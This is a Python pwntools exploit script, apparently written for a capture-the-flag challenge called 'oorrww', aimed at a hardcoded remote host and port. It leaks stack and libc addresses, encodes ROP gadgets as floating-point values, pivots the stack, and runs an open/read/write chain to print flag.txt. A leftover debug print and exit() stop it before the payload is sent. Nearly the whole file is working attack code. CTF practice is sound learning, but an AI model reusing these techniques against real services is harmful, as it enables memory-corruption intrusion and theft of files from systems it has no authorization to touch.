#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./oorrww_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc 193.148.168.30 7666"    # `nc <host> <port>`
f = lambda i:int64(i).view("f8")
from numpy import*
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+190   
c
"""

def ieee_754_conversion(n):
    return f(n)

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b": ")
    leak = r.recvuntil(b"!")[:-1].split(b" ")
    saved = leak[1]
    leak = [int(float(i).hex()[5:-6],16) for i in leak]
    stack = leak[0]
    
    libc.address = leak[1] - libc.sym.__isoc99_scanf
    rop = ROP(libc)

    POP_RDI = ieee_754_conversion(rop.rdi.address)
    POP_RSI = ieee_754_conversion(rop.rsi.address)
    POP_RDX_RBX = ieee_754_conversion(rop.rdx.address)
    LEAVE = (rop.find_gadget(["leave", "ret"]).address)
    
    read = [POP_RDI , ieee_754_conversion(0) , POP_RSI , ieee_754_conversion(stack+8*10) , POP_RDX_RBX , ieee_754_conversion(2000) , ieee_754_conversion(2000),  ieee_754_conversion(libc.sym.read)]
    
    print(bstr(ieee_754_conversion(u64(b"flag.txt"))))
    exit()
    r.sendline(bstr(ieee_754_conversion(u64(b"flag.txt"))))
    r.sendline(bstr(ieee_754_conversion(0)))

    for i in read:
        r.sendline(bstr(i))

    for i in range(18-len(read)):
        r.sendline(b"-")

    r.sendline(bstr(ieee_754_conversion(stack+8)))
    r.sendline(bstr(ieee_754_conversion(LEAVE)))

    sleep(0.1)

    rop.open(stack, 0, 0)
    rop.read(3, stack, 50)
    rop.write(1, stack, 50)

    r.send(rop.chain())

    r.interactive()

if __name__ == "__main__":
    main()